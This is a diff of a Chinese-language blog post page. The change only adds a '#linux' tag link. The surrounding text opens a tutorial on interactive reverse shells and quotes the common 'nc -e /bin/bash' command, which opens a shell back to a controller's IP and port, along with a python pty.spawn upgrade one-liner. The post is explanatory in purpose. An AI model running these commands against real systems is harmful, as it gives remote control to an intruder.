@@ -63,6 +63,10 @@
       <span class="post-date">2022-05-02</span>
       
   
+    
+      <a href="https://chenx6.github.io/tags/linux/">#linux</a>
+    
+  
 
       <p>在网上能看到一堆的反弹 Shell 方法，最常见的就是先用 <code>nc -e /bin/bash $控制机IP $控制机端口</code> 弹出一个 Shell，然后再用 <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> 这样来升级成交互式 Shell。这样的话得保证环境里有 nc + python，或者得在被控机上下载多个文件。这样的话，还不如直接自己写一个 Shell 呢 233。</p>
 <h2 id="ke-jiao-hu-shell-de-yuan-li">“可交互 Shell” 的原理</h2>
